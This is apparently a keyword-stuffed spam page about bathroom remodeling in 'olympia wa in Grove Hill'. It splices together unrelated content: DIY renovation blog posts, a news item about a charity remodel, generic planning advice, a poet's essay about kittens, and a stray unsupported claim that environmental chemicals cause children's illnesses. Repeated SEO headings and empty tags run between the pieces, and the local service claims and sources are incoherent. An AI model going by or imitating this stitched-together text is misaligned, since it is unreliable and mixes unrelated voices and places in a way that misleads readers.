cool. It goes from blue to green to red depending on the temperature, so no surprises and no scalding. Although Kelvon can't speak, Candita knows he's aware just how great this bathroom is.</p>   <p>&quot;His eyes got really big. He was looking around,&quot; Crawford said. &quot;It's incredible, it's really incredible.&quot;</p>   <p>Kelvon and his mom weren't the only winners, this year Schloegel picked two families.</p>   <p>Little Elizabeth Bird is also getting a new bathroom. When Schloegel arrived on the job, a lot of work had to be done. After the remodel, &#xa0;Elizabeth can use everything from the shower to the sink without help. Plus it&#x2019;s purple, her favorite color.</p>   <p>&#x201c;It's really fun to watch her. I don't think we'll be able to get her out,&#x201d; her mom, Susan, said.</p>   <p>Because what little girl doesn't want her very own bathroom? Now she can use it all by herself thanks to Schloegel Design Remodel. These bathrooms are huge problem solved for both these families.</p>  </div>

   <div>   <h1>Enjoy our best bathroom remodeling ideas</h1>   <p>Careful planning is the key to a successful bathroom-remodeling project. Before you begin any work in the bathroom, create a budget, a floor plan, a list of supplies, a timetable, and important legal considerations. Let&#x2019;s break it down by subject.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>First</strong>, create a budget. Determine how much money you can comfortably spend, and save about 20 percent for emergencies. Get estimates for the work that needs professionals, and always include electrical, plumbing, heating and cooling, and drywall installation costs in your budget.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>Second</strong>, design a floor plan. Ask yourself, will you be working with the existing space or will you be adding on or knocking down walls? Check to make sure you will not disturb the electrical wiring, plumbing, or zoning regulations. Next, measure the amount of space you have and draw a floor plan. In drawing the plan, first put in all the items that are fixed. For example, if the toilet must be in one place because of plumbing, it is a fixed item. Experiment with how you like your floor plan, using different arrangements, with different types of cabinetry, shelves, or even walls. You might try pocket doors to save space, and corner sinks, floating sinks, or pedestal sinks to save even more space. L-shaped vanities and alcoves also save space. In addition, corner showers conserve space, and clear glass in showers creates the illusion of even more space. You may want to add windows or mirrors to let in light.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>Third</strong>, make a list of the supplies you&#x2019;ll need and make sure they are available when you need them. Some typical supplies include sinks, flooring, wall tile, counter tops, lighting, medicine cabinets, showers, bath tubs, cabinets and cabinet handles, toilets, extra storage, faucets, toilet paper holders, paint or wallpaper, chairs, accessories (like storage containers and/or artwork), as well as tools you have or can buy.</p>   <p><strong>Fourth</strong>, create a timetable. Talk to experts or people at home improvement stores to plan how much time you&#x2019;ll need. If you&#x2019;re hiring contractors, work with them to design a timetable you all can follow.</p>   <p>Plan projects according to the time you have available. Put in a new toilet and sink one weekend, for example, and paint another. You don&#x2019;t have to do it all at once, so plan sensibly. Don&#x2019;t paint the walls or install woodwork until the hardware is taken care of &#x2014; you don&#x2019;t want to damage work you&#x2019;ve already done. Above all, be flexible and allow time for the unexpected or even emergencies to happen.</p>   <p><strong>Fifth</strong>, keep in mind legal considerations. Get and post a building permit, pay any necessary fees, make sure you, your contractor, and any workers have insurance coverage, and keep children and animals away from the construction area.</p>   <p>With&#xa0; we take all the hassle of remodeling from you.

When you&#x2019;re a poet you get to do this sort of thing and actually admit it to people &#x2014; thinking is part of your job description, and the odder the subject matter, the better. You don&#x2019;t always have to think in pairs or opposites &#x2014; last week, for instance, I thought about growth and paid no attention whatsoever to decay.</span></p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p><span>Maybe some poets can think endlessly about abstractions, but I&#x2019;m nothing if not literal. My poems are anchored to the real world as by an anvil: they do not float off into theoretical territory. So when I&#x2019;m thinking about proximity, my brain immediately looks for a concrete example. Like the kitten climbing up my nightgown at this very moment, swaying slightly on her own weight, and now high enough to have scared herself into some pitiful mewing. Her mother is suddenly right beside us, wondering what kind of harm I&#x2019;m causing. The other three kittens are having a wrestling match on the bathroom scale.</span></p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><span>These baby felines are a month old. I didn&#x2019;t see the birth because I was out to dinner, but I came home only minutes later &#x2014; they were still damp and sort of grub-like. I&#x2019;ve watched and stroked them every day since, and am as close to them as I am to anyone else in my life.</span></p>   <p><span>The kits still live in the bathroom, even though they&#x2019;ve figured out how to climb over the barricade of window screens I constructed to keep them in. So far they&#x2019;ve never braved the kitchen tile to explore the corner where my home office is. It&#x2019;s when I&#x2019;m over here that I think about distance. One of the things I do for a living is teach poetry classes on the internet. People all over the world have written with me in the fifteen years I&#x2019;ve been doing this: from Cyprus, Guam, Lisbon, London, northern Sweden and the South Pole. I&#x2019;m currently running a Poetry Boot Camp that includes two poets in South Korea. They&#x2019;re both Americans teaching there and they don&#x2019;t know each other. They found me by surfing the web.</span></p>   <p><span>A lot can be said about the demise of civilization due to computer use, but this miracle of contact is one of the things I love about our modern age. The Internet reminds me of a fishing expedition. You cast in your baited hook, which in my case is an erratically-updated website, leave your pole wedged between rocks on the bank and go eat lunch with your friends. When you come back, if you&#x2019;re lucky, there&#x2019;s a lovely trout tugging at your line, and you reel it in. If you&#x2019;re really lucky, the trout has already made a PayPal deposit for your poetry class.</span></p>   <p><span>Why two separate English teachers working in South Korea would find my website and sign up for the same session, I cannot fathom. Coincidentally, I have two friends teaching English in Seoul this spring, a pair of brothers, but none of these people know each other. No one from Korea has ever taken my Boot Camp before. It&#x2019;s just a mystery.</span></p>   <p><span>Kind of like the mystery of white stripes appearing after a week on one of the gray kittens. One day there they were, all over her stomach and back legs, and the insides of her ears had turned white, too. She went from a fuzzy gray lump to an elegant lioness overnight. If I hadn&#x2019;t been keeping such a close eye on them all, I never would have believed it.</span></p>   <p><span>I haven&#x2019;t come to any conclusions about proximity and distance. I&#x2019;m not sure there are any to draw. I&#x2019;m just trying to learn to sit with paradox and not go completely insane.</span></p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p><span>Recommended For You</span></p>   <div>    <p><span>Do me a favor, and write something by hand today, just to prove you haven&#x2019;t forgotten how. Please? For me? A song lyric, a to-do list. A home-made prayer.</span></p>    <p><span>.</span></p>   </div>   <div>    <p><span>If you practice assuming goodness, then no matter what the conversation ends up being about, you&#x2019;re going to be strong enough to hear it. Your body isn&#x2019;t going to be pre-primed for rage or tears. Your friends and family will feel better in your company.</span></p>    <p><span>.</span></p>    <div>     <p><span>The strange thing about humans is how little one can deduce just by looking at them. Sure, there&#x2019;s the obvious: tall, short, thin, stout, straight hair or curly, old or young. Skin color. Clothing style. Syntax. But even though our minds are usually making snap judgements and concocting stories about everyone we see, the real stories almost never show on the outside.</span></p>    </div>   </div>  </div>  
   <div>   <p>I&#x2019;m coming to you with an actual completely finished room of the house-the basement bathroom (okay minus the door and touch ups to the trim).</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Greg and I started on it, with some help from family, in May. &#xa0;Weekends, weekday evenings and vacation time were spent on this project. &#xa0;Remember, we tore the old bathroom down then started fresh.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Here&#x2019;s what the old bathroom looked like&#x2026;</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Nasty. &#xa0;The cheapest shower stall you can get (and damaged at that), gross carpet, fiberglass paneling, a window that let water flow in and just all kinds of bad. &#xa0;The door would get jammed into the ductwork so that&#x2019;s as far as it would open.</p>   <p>Keep in mind when you look at the photos (which aren&#x2019;t the greatest but I couldn&#x2019;t wait to share) that the bathroom is basically the same size as it was before. &#xa0;We took just a smidge of space from the utility room to make the custom shower. &#xa0;The ductwork runs through the middle of the basement which is what you see in the pics. &#xa0;As long as you aren&#x2019;t any taller than 6&#x2019;3&#x2033; it is a comfortable space. &#xa0;Ready to see it now?</p>   <p>Can I brag a lil bit and tell you this was renovated for under $1,200? &#xa0;Greg did the work himself with some help from family and myself. &#xa0;The paint is Benjamin Moore&#x2019;s Gray Owl which is the same gray green in the master bedroom. &#xa0;It looks different in each room due to lighting which works for me. &#xa0;You can find most of the resources from .</p>   <p>This is my favorite room of the house right now. &#xa0;A little more detail work (add some color and accessories), the addition of an actual door and we have serenity.</p>   <div>    <h3>Related posts:</h3>   </div>  </div>  
   <div>   <p>My parents live near a Habitat for Humanity home store (a thrift store that only carries remodeling and building supplies &#x2013; quite the score if you happen to be working on a house). This morning they went to the store to see if they could find any cabinets that would work for our new kitchen. We&#x2019;re leaving all of our existing cabinets in place, but needed to add cabinets in the area that is currently dining room and going to be annexed as kitchen. We had at the Habitat for Humanity store near our house over the weekend, but we needed another corner cabinet, a regular cabinet to go along a straight wall, and a couple smaller cabinets to go at either end of the bar we&#x2019;re building.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>My mother called a while ago and said that they had found another corner cabinet, a double cabinet that will go in the straight section between the two corner units, and a narrow cabinet for the end of the bar.

We priced similar cabinets at Home Depot and those three units would have been about $470.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Because we&#x2019;re so accustomed to shopping at thrift stores and buying second-hand whenever possible, we&#x2019;ve just continued that mentality into our kitchen remodel project, and it&#x2019;s saved us a whole lotta money so far. We&#x2019;ve bought a dishwasher, stove, sink, pot rack, pantry door, and four cabinet units used. We&#x2019;ve spent $435 on all of those items together &#x2013; less than the dishwasher alone would have cost if we had just headed to Home Depot with our shopping list.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>And we&#x2019;ve found all of these items in less than two weeks, and with just a few trips across town to buy things from people selling them on Craig&#x2019;s List. It really hasn&#x2019;t been inconvenient at all, and it&#x2019;s been like a scavenger hunt &#x2013; much more fun than just plunking down our credit card for $5000 worth of new appliances and cabinets.</p>   <p>If you&#x2019;re considering a home improvement project, I would highly recommend shopping for used stuff first, and only paying retail for the stuff that you can&#x2019;t find second-hand. It&#x2019;s amazing what people will get rid of just because they want to upgrade to a newer model or a different color. And a home improvement project is much more fun if you&#x2019;re not stressed out about how much it&#x2019;s costing you.</p>   <p>Last updated by on <time>August 26, 2012</time>.</p>   <div>    <p>Related posts:</p>   </div>  </div>

Scientists believe that many of these illnesses are caused by chemicals in our environment, which children absorb at a rate much higher than adults.

   <div>   <p>New drywall, tile, windows, fixtures, floor, bead-board, and <em>one urinal later</em>, and I can officially say the man-cave bathroom the most complete room in any of the four buildings on our property.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>I would love this bathroom if it just sprang out of the ground looking like this, but I love it even more considering what it started out as&#x2026;</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Um, yeah. It still kinda makes me shudder. And gag.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>A little background for those that are new around here. The property we&#x2019;re <span>renovating</span> rebuilding our house on came with an old gas station, while we work on the main house. When we move out of our little 400 square foot slice of heaven, this part of the Station will be for MysteryMan&#x2019;s particular use &#x2013; you know, a haven for scratching and burping and all of that man stuff.</p>   <p>So when it came time to choose the look and feel of the bathroom, it had to be masculine&#x2026;</p>   <p>No frills&#x2026;</p>   <p>And,<em> by god</em>, it needed to have a urinal.</p>   <p>Most women are all <em>areyoueffingkiddingme</em> about the urinal, but&#xa0; I actually really enjoy it if nothing else just for the shouts of delight from every guy that sees it. I&#x2019;ve never seen dudes more excited to pee inside the house. (City boys also get pretty jazzed about being able to pee in the cornfields out here, which just goes to show that men really never mature past the age of twelve. And yet we still love you guys.) Also, it uses less water, there are never any, uh, <em>aiming issues </em>to clean up, and there is zero chance of the toilet seat being left up.</p>   <p>Also, this one looks pretty damn sweet if I do say so myself &#x2013; and not just because I spent hours of my life tiling every square inch of the wall behind it.</p>   <h2>The Style</h2>   <p>Here was my original idea board from : </p>   <p>While I knew I wanted to use blacks and browns, I was stuck for a while on the use of the materials,&#xa0; where to tile, and how much. And then I saw on and all the pieces just fell into place&#x2026;</p>   <p>Except MysteryMan would have strung me up by my toes if I put anything remotely resembling pink or purple into his bathroom.</p>   <p>So we went a different direction&#x2026;</p>   <p>What I used:</p>   <ul>    <li>Bead-board from our local home-improvement store, painted satin black</li>    <li> (at $7/sq ft)</li>    <li>Chair rail, painted satin black</li>    <li> paint</li>    <li>Stamped colored concrete for the floor</li>   </ul>   <h2>Finishing Touches</h2>   <p>If you&#x2019;re interested in the How-To, here&#x2019;s what you need to know:</p>   <p>I admit that the last little bit of it was the worst. And not just because of the . The hardest part about this whole bathroom was actually these windows.</p>   <div>      </div>   <p>We furred the walls out with 2&#xd7;3&#x2019;s and in retrospect should have popped the old windows out and created wood frames around them. (It was February in Michigan at the time though, so I don&#x2019;t know that we can be faulted for wanting to keep the windows in as long as possible.) Instead we had the glass block installed in the old concrete opening, and we ended up with some nasty areas around the windows to frame in.</p>   <p>After weeks of hemming-and-hawing around it, I finally just got out the table saw, miter saw, finish nailer and some shims and started in on it. Its not remotely square, but I&#x2019;ve found there&#x2019;s not much you can do to black trim that won&#x2019;t be forgiven with a little black caulk.</p>   <p>I was also a little stymied by the top of the half-wall I built between the urinal and sink. Tile? No tile?</p>   <p>Finally I just grabbed some leftover 1&#xd7;6 from building the window casings&#x2026;</p>   <p>And used the router to put a fancy edge on it.</p>   <p>I&#x2019;m so glib about that, but I&#x2019;ll tell you straight up that even with the router table, I take seven deep breaths before I use that thing. If ever there was a tool I was going to lose a finger to&#x2026;</p>   <p>Don&#x2019;t worry, no digits lost this time, people.</p>   <p>The rest of my <span>life</span> weekend was spent trimming around various doors and weekends.</p>   <p>And since I just now decided while looking at these pictures to put some baseboard around the bathroom as well, it ain&#x2019;t over yet!</p>   <h2>The Missing Piece</h2>   <p>So the one thing this room needs yet, is a little something on this wall:</p>   <p>Right?</p>   <p>But I&#x2019;m not sure which direction to go. I&#x2019;m thinking maybe a vintage Texaco sign, since it is a gas station after all.</p>   <p>Or beer?</p>   <p>Maybe a pinup or two?</p>   <p>Nothing has really struck me as being &#x201c;right&#x201d; yet, so what do you all think? What&#x2019;s the perfect finishing piece for this man-cave bathroom?</p>   <p><strong>Edit:</strong> To see what I decided on, check out the final wall art .</p>  </div>

   <div>   <p>I might have mentioned before that I&#x2019;m a horrible daughter who has been absorbed in building her own house for a year. About the time we started building the house my Mom ripped apart her bathroom for what we thought would be a quick update&#x2026; new tile floor, new vanity, back in business.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Word to the wise: The only place it&#x2019;s ever that easy is on HGTV.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>First, because of the odd angles in her bathroom, the 60&#x2033; cabinet she bought wouldn&#x2019;t fit.

In the end it would look something like this:</p>   <p>My mom noticed what you probably just did, that it looks a little odd to have the sink off center of the cabinet doors and drawers. And the question is, does it look better off center?</p>   <p>Or perhaps off center with a larger light?</p>   <p>(Sorry for the crap photoshop job on these, it&#x2019;s been a long weekend.)</p>   <p>I&#x2019;m voting for the centered sink, but that may just be because I don&#x2019;t want to spend any more time wedged under that cabinet. But before we make any permanent decisions, my mom is asking for your help, what do you think&#x2013; center or not?</p>  </div>  
   <div>   <h2>Ring in the new year with new trends and technologies in kitchen and bath designs.</h2>   <p> 2016 seems to be the year for eclectic choices. For those who are bold enough to mix design finishes without fear of ending up with an aesthetic disaster. I think we&#x2019;ll be seeing a lot more offered in the way of aging in place features as our Baby Boomers are coming of age. Bold wood finishes and tile back splashes are in. Alternate dining tables are being incorporated into the kitchen island or peninsula. And more and more attention is being directed towards green alternatives. Recycled or rapidly renewable materials are in. Like recycled glass countertops, rapidly renewable wood species for floors and cabinetry.

   <div>   <h1>Bathroom Renovation: Go With A Pro Or Do It Alone?</h1>   <div>    <span>Posted on </span>    <span> by </span>    <span> <span>&#x2014;</span> </span>   </div>    <div>    <h1>Say Bye-Bye To DIY</h1>    <p>There are hundreds of household projects that inspire excellent DIY (&#x201c;do it yourself&#x201d;) opportunities, like painting kitchen cabinets, repairing a leaky faucet, screening in a porch or even . These self-reliant projects make you feel good about yourself, boosting your confidence and self-worth, and make you truly appreciate the hard-earned finished project.</p>   <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>However, there are some projects, like bathroom design and bathroom renovations, which you shouldn&#x2019;t take into your own hands. These projects require the expertise, experience and dexterity of true professionals.</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>Here are three reasons you&#x2019;re better off seeking out the experts when remodeling or resurfacing your bathroom:</p>   <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <h2><b>OVERSPENDING</b></h2>    <p>This is the most common mistake people make when going the DIY route. You may have wonderful intentions for taking on a bathroom renovation yourself, but what you <em>don&#x2019;t </em>have is years of experience. This lack of experience often translates into wasted money on the wrong tools, subpar materials, fixtures that don&#x2019;t fit and supplies you don&#x2019;t need.</p>    <h2><b>DISSATISFACTION</b></h2>    <p>You must keep in mind that remodeling a bathroom is a process in which each step builds on the one before it. So if you&#x2019;re making small errors along the way, they&#x2019;ll build up to a big letdown &#x2014; a letdown that is very inconsistent with the remodel you envisioned.</p>    <p>Another equally important consideration is the plumbing factor &#x2014; you definitely don&#x2019;t want to experiment with your pipes and risk a septic situation. Oftentimes, DIY plumbing leads to calling in the plumber to fix a problem you&#x2019;ve created.</p>    <h2><b>LABOR-INTENSIVE &amp; TIME-CONSUMING</b></h2>    <p>You have a life of your own, which likely includes 40 or more hours a week of work &#x2014; plus your personal responsibilities involving family, friends and hobbies. Taking on a DIY bathroom renovation is going to take a huge chunk of time and energy out of your life, two things most of us can&#x2019;t afford to trim down.</p>    <p>It&#x2019;s an undeniable fact: an expert will get the job done faster and better than someone with little to no experience. Remodeling your bathroom yourself can take over a month, depending on the scale of the project and how much time each day you spend on it.</p>    <p>Are you willing to surrender that time and energy to your bathroom?</p>    <p>So don&#x2019;t do it alone. If you want that perfect bathroom renovation &#x2014; the one you&#x2019;ve been envisioning in your head for months, or even years &#x2014; go with the experts.

While I really like that bathroom, I&#x2019;m excited to show you our master bathroom because I <em>love</em> it! More than a year later I still walk into it and marvel at the changes.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>This is what we started with:</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Again, how I wish I had remembered to get good before pictures! One day I will learn&#x2026;maybe.</p>   <p>Here are a few of my <b>least favorite things about this space</b>:</p>   <ul>    <li>Repeat of the<b> yellow-gold theme</b>: toilet, sinks, tile, vinyl, shower surround, wall paint &#x2013; seemingly everything.</li>    <li>Frosted brown aluminum window like the main bathroom.</li>    <li>Every piece of<b> wood was dark brown </b>and the vanity was <em>8 feet long</em>.</li>    <li>Like the main bath, the lovely wood-and-gold towel bars were repeated here, as well as the 70s sink faucets and huge mirror, except this one was, like the vanity,&#xa0;<i>eight feet long</i>. Too much of me, I can tell you that.</li>    <li>It was broken into two rooms: a carpeted &#x201c;dressing area&#x201d; and a toilet/shower area which were separated by a wall with a pocket door.</li>    <li>There was another pocket door leading from the bedroom, which scraped on a misplaced nail if you tried to close it.</li>    <li>It was <b>dark, dark, dark</b>. You needed a light no matter the time of day or season and you couldn&#x2019;t see outside anywhere in the room. I personally dislike bathrooms with no windows (except maybe powder rooms), which helps explain what drove my vision for this room.</li>   </ul>   <p><strong>The first thing we did was to replace the pocket door into the bathroom with a french door</strong> (hung with a curtain for privacy).&#xa0;We did this about a year after we moved in when we were . We removed both of the pocket doors here to use as regular doors in the new area because they were beautiful solid wood paneled doors that matched those in the old rooms.</p>   <p>Then we <strong>demolished the pocket-door wall</strong> separating the vanity area from the shower area in order to create one big space. This is the same view as the before picture &#x2013; it feels so much bigger, it&#x2019;s hard to believe it&#x2019;s the same room.</p>   <p>After we removed the wall <strong>we added a long, high window over the tub</strong> <strong>and</strong> replaced the frosted aluminum window with <strong>a double hung vinyl that was <i>not frosted</i></strong> so I can look out at the trees and see outside.&#xa0;Of course, part of any good DIY project is making it last a really long time ahem, so after removing the wall and adding the windows we didn&#x2019;t complete the rest of the renovation for about nine, looong months.&#xa0;We lived with exposed pipes, drywall, and studs for all that time.</p>   <p>Then we buckled down, took a week in summer when the kids were out of town and <strong>tiled both this room and the other bath</strong>.&#xa0;Need I I thought not.</p>   <h5>Here&#x2019;s the complete tour of our Master Bathroom:</h5>   <p>Besides the new window (with another &#x2013; this one with a pretty drawn-thread design), we installed a new toilet, beadboard panelling and molding.</p>   <h6>My biggest money-saving tip is: Buy in advance when the deals are good. I knew we would be redoing the baths, so when I found things I wanted to incorporate, I would buy them and store them:</h6>   <ul>    <li>The hotel rack came from a thrift store for $3</li>    <li>The small hanging candle holder with prisms on clearance for $8 at Target</li>    <li>The shelf over the tub was just $17 on clearance at Target as well (just like $59 ones I&#x2019;d seen at PB).</li>    <li>I how I found the light fixtures for both the baths at another clearance sale for $13 each.</li>    <li>We bought all the windows at a discount window supplier.</li>   </ul>   <p><strong>The shower.</strong> This is the part where I beg and plead: if you are building a house, <i>please make all the fixtures white</i>.&#xa0;I think I shed some tears over this shower.&#xa0;The original shower was a fiberglass one-piece unit that was in good condition and I would&#x2019;ve been happy to leave it in place but for one thing: it was yellow-gold. Almost all the way to the ceiling, and not easy to cover up .</p>   <p>I searched and searched for a cost-effective shower surround, and let me just say, oh. my. goodness. You wouldn&#x2019;t believe what they wanted for FAKE marble, people. And I wanted easy clean, which eliminated tile (like I would diy that, anyway!). I really wanted a smooth surface, but it couldn&#x2019;t be found at a reasonable price.</p>   <p>In the end, we <b>ended up replacing the gold shower stall with this $340 unit consisting of three wall pieces and the floor pan</b>. And while I love that it&#x2019;s white, it&#x2019;s exactly what I feared: all the lines from the &#x201c;fake tile&#x201d; hold enough moisture to allow pink mold to form (in our climate, at least). Sigh. (The green towel hanging on the left is a microfiber cloth we use after each shower to help the mold not form as quickly).</p>   <p><strong>Here&#x2019;s a little detail of the shower curtain</strong>. In order to have it hang closer to the ceiling, I added a piece of coordinating fabric to the top and bottom and then simply used curtain clips to hang it on the rod.&#xa0;Why a curtain on a shower instead of doors? Well, $300 dollars to start&#x2026;but also I just can&#x2019;t stand the cleaning issues with doors. Ugh, those tracks are awful.</p>   <p>This is the <strong>view from the window</strong> which shows the bi fold doors to the closet.&#xa0;And see the <b>hook next to the shower</b>? I love this little touch- it&#x2019;s there to hang your towel on when you are showering so you don&#x2019;t have to reach too far.</p>   <p>And here&#x2019;s my favorite part of the room<b>&#xa0;</b>&#x2013; <strong>our clawfoot tub</strong>. It&#x2019;s also the reason <i>this room cost more than twice what the other bath did</i>. Ah, but I always wanted a clawfoot tub. And it is&#xa0;nice to soak in &#x2013; regular tubs just don&#x2019;t compare.&#xa0;Luckily, I didn&#x2019;t know how much it would cost in the end, otherwise&#x2026;who knows? Two pedestal sinks would&#x2019;ve looked good here, too, and been A LOT cheaper. But I know I would&#x2019;ve always wished for the tub&#x2026;</p>   <p>Our tub was a &#x201c;deal&#x201d; on Craigslist <strong>bought two years before the renovation for $100</strong>. It was dirty so I thought it would just need a good cleaning. When it was finally time to do the remodel, we realized that the enamel was cracked on the bottom and therefore wouldn&#x2019;t be water tight and needed to be refinished.</p>   <p>We then searched for a plumber to move the pipe from the wall to the floor to accommodate the tub. The first bid we got back was $1500! Aaack- that was the budget for the whole room. Talk about shock.&#xa0;We finally found someone who would do it for half the price if we did the finish part. Can you believe it- feeling like $700 was a deal?</p>   <p>After that I needed to buy the exposed pipes and faucet. Wow. I did not know they would be so expensive. So, how much did the tub cost in the end?</p>   <ul>    <li>Tub: $100</li>    <li>Refinishing: $325</li>    <li>Plumbing labor: $700</li>    <li>Supply lines: $39.99 (a deal, believe it or not)</li>    <li>Faucet and drain: $248.00 (*faint*)</li>    <li>Total: <i>one expensive tub</i></li>   </ul>   <p>Moral? Be very sure that tub is worth it.</p>   <p>And here is <strong>the final corner of the room and our dresser-turned-vanity</strong>. The corner that wasn&#x2019;t finished until&#xa0;<i>a year and a half</i> after the rest of the room was completed. We seriously had a &#x201c;temporary&#x201d; vanity here that had been cobbled together from the parts we had cut off of the old one. It wasn&#x2019;t pretty- notice how I don&#x2019;t have a picture?</p>   <p><em>But far be it from me to keep any secrets. I&#x2019;m going to show it in all it&#x2019;s glory in a post about <b>remaking this dresser into a vanity</b> ().</em></p>   <p>Why would I want to make a dresser into a vanity? Well, I like the look <em>and</em> I like the price: $70.&#xa0;And after the shock of the tub, $70 sounded&#xa0;<i>real</i> nice to me.</p>   <p>How did we come out in the end? The&#xa0;total to redo every surface and fixture in the room was<b> just under $3,000 </b>with the tub being about half. Which seems like a lot of money to me, and we never would have thought we had enough at one time to do it, but because <b>we spread it out over a couple of years</b>, we could afford it.</p>   <p>And I have the bathroom of my dreams.&#xa0;Well, until the next house, where I&#x2019;m sure my dream will be something different.</p>   <p>&#xa0;</p>   <p>PS &#x2013; View this to get his take on the bathroom remodeling saga!</p>   <p>&#xa0;</p>   <p><em>Linked to: </em></p>   <div>    <h3><em>Related</em></h3>   </div>   </div>

They had long dreamed of having a sauna built into a new shower. They started window-shopping for tiles and color schemes, faucets and plumbing fixtures.</p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>    <p>They knew they needed advice and design consultation, so they called their licensed master plumber to come over and discuss their options. These included relocating the fixtures to add a skylight or a larger window for more natural light. They wanted to eliminate an ugly old radiator and replace it with radiant heat in the floor, so that when they stepped out of the shower, the floor would feel nice and warm. This would increase the size of their bathroom without the costly expense of relocating walls. Frank and Louise also discussed adding a laundry chute from their new bathroom down to their laundry room.</p>    <p>Their plumber was able to make some cost-effective suggestions, taking the stress out of the project. He recommended removing all the old, stained plaster and sheet rock walls and replacing old, leaky water lines with brand new copper piping and valves. Also, while the walls were open, he suggested replacing outdated wiring, switches and lights and showed them how they could have two exhaust fans installed&#x2014;one in the new shower and one outside the shower operating on separate switches.</p>    <p>The couple were pleased with the plans and couldn&#x2019;t wait to begin renovations. With their tile and fixtures chosen and all the decisions made, the plumber assured Frank and Louise that the work would be completed in three to four days from start of demolition to the final stages of grouting and painting&#x2014;and it was.</p>    <p>Throughout the project, their plumber coordinated the work of the carpenter, electrician and painter. He was instrumental in reviewing their budget and adhering to it. Now, with the bathroom renovation complete, the couple decided their next project will be their kitchen.

The original cabinetry was in excellent condition in both bathrooms so <strong>I had each vanity&#xa0;refinished&#xa0;with&#xa0;a charcoal hued paint to create a modern, classic look.</strong> She fell in love with the bone &amp; brass hardware that I selected for &#xa0;so we used&#xa0;it here as well which created a thoughtfully&#xa0;layered&#xa0;look&#x2013;nothing here reeks of &#x201c;cookie cutter&#xa0;upgrades&#x201d;. <strong>The real stunner, however, is the <em>custom</em> butcher block countertop!!</strong> *sighs* There are no pictures alive that can do it justice and while I&#x2019;m taking credit for the concept, <strong>the beautiful fabrication &amp; finish is solely&#xa0;due to my out-of-this-world carpenter.</strong> &#xa0;I&#x2019;m lucky to have a team&#xa0;of some of THE BEST &amp; MOST DETAILED craftsmen and in this case, he knocked it out of the park. <strong>Layer by layer, this thing was conditioned, stained, sanded &amp; buffed (3x!) by hand and you can TELL when you see it in person.</strong> The cuts/finishing for the Kohler undermount sink&#xa0;is&#xa0;one of my favorite parts of this project&#x2026;.because it was done to<em>&#xa0;perfection.</em>&#xa0;And while &#x201c;cutting a hole for a sink&#x201d;&#xa0;may not sounds like a big deal here&#x2019;s the thing: when you&#x2019;re doing ANY custom fabrication, every.bit.matters. It&#x2019;s definitely a <em>measure twice, cut once</em> kinda thing.&#xa0;&#xa0;Every part&#xa0;needs to be templated &amp; cut by hand and when you run your fingers across <em>this</em> sink opening??&#xa0;<em><strong>BABAYYYYYYYYYYYY</strong></em> (Whitney Houston voice)<strong>!!!!</strong> <em>It&#x2019;s seriously like butter.</em>&#xa0;I&#x2019;d bet my life that they are THEE smoothest &amp; silkiest butcher block countertops you&#x2019;ll ever set eyes (or hands) on.</p>   <p>While I was <em>dyyyyyyyyying</em> to add wallpaper to both of these bathrooms for texture, the clients were not fans of wallcovering and since adequate lighting for makeup application was a must, the color palette&#xa0;stayed light to keep the bathroom bright &amp; airy.</p>   <p><strong>Custom floor to ceiling lined shower curtain.&#xa0;</strong></p>   <p><strong>Vintage-style crystal door hardware.</strong></p>   <p><strong>Skirted toilet</strong> (I&#x2019;m obsessed with these!).</p>   <p><strong>That beautiful, perfect sink opening&#x2026;..</strong></p>   <p><strong>Brick lay subway&#xa0;tile to the ceiling</strong>&#xa0;+<strong>&#xa0;charcoal grout</strong> (always makes a huge difference!)</p>   <p>So as you can see, even changing a few things in this bathroom made a HUGE difference.

